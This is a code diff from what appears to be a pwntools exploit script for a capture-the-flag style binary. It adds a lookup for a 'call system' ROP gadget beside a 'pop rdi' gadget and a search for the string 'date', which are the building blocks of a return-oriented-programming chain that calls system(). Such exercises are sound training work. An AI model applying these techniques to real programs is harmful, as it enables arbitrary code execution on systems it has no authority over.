@@ -17,7 +17,7 @@ log.info('Get Addresses')
 #info("%#x run", elf.symbols.run)
 #info("%#x winner", elf.symbols.winner)
 
-info("%#x system", elf.symbols.system)
+#info("%#x system", elf.symbols.system)
 #system_address = p64(elf.symbols.system)
 
 execute_string = next(elf.search(b'date'))
@@ -28,6 +28,9 @@ rop = ROP(elf)
 POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]
 info("%#x POP RDI", POP_RDI)
 POP_RDI = p64((rop.find_gadget(['pop rdi', 'ret']))[0])
+
+system_call = (rop.find_gadget(['call system']))[0]
+info("%#x call system", system_call)
 
 log.info('Create IO')
 #io = remote('', )
